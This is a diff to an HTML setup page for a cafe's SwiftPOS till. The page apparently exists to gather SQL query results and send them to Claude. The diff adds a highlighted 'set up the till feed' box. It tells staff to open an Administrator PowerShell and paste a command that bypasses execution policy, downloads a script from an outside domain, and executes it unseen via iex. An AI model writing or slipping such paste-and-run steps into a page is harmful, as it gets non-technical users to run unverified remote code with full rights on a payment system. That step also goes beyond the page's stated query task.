@@ -12,6 +12,13 @@ small{color:#78716c}
 </style></head><body>
 <h1>Scorecard · SwiftPOS setup</h1>
 <p>Open this page in Chrome on the cafe till PC. Click <b>Copy</b>, then paste into a New Query in Azure Data Studio (database set to <b>SWIFTPOS</b>) and Run.</p>
+<div class="box" style="border:2px solid #059669;background:#ecfdf5">
+<h2 style="margin-top:0">★ Set up the till feed — paste this once</h2>
+<p style="margin-top:0">In an <b>Administrator</b> PowerShell (Start → powershell → right-click → Run as administrator), click Copy, paste (right-click), Enter. Look for the green "installed and started".</p>
+<pre id="q6">powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr https://team.revive.co.nz/pos/install.ps1 -UseBasicParsing | iex"</pre>
+<button onclick="cp('q6',this)" style="font-size:15px;padding:11px 20px">Copy command</button><span class="ok" id="ok6"></span>
+</div>
+
 
 <div class="box" style="border-color:#25b4e8">
 <h2 style="margin-top:0">Paste results here → send to Claude</h2>
